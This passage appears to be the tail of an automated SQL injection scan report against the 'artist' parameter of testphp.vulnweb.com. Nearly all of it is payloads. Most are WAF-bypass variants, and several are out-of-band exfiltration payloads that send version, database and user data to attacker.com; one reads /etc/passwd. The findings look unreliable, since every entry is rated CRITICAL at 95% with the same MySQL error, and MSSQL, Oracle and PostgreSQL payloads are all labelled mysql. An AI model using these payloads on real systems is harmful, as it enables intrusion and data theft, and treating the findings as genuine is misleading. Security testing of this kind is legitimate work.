+    Payload: ' %0dOR%0d1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[185] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' %0bOR%0b1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[186] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' %0cOR%0c1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[187] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' %a0OR%a01=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[188] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '+OR+1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[189] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '/**/OR/**/1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[190] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR/**/ 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[191] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' oR 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[192] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '/**/oR/**/1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[193] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' Or 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[194] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[195] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: -1' OR 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[196] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: -1) OR 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[197] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION/**/SELECT/**/NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[198] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' /*!UNION*/ /*!SELECT*/ NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[199] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' uni%0bon sel%0bect NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[200] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' %55NION %53ELECT NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[201] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNI/**/ON SEL/**/ECT NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[202] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' /*!50000UNION*/ /*!50000SELECT*/ NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[203] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '+/*!50000UNION*/+/*!50000SELECT*/+NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[204] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION%23%0aSELECT NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[205] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION%23random%0aSELECT NULL--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.022s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[206] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\'))--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[207] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\'))--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[208] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; EXEC master..xp_dirtree '\\attacker.com\share'--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[209] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DECLARE @x VARCHAR(1024);SET @x=(SELECT @@version);EXEC('master..xp_dirtree "\\'+@x+'.attacker.com\x"')--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.031s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[210] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com')--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.033s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[211] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[212] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/">%remote;]>'),'/l') FROM dual--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[213] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[214] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT lo_import('/etc/passwd')--
+    Type: oob_detection
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+======================================================================
+END OF REPORT
+======================================================================
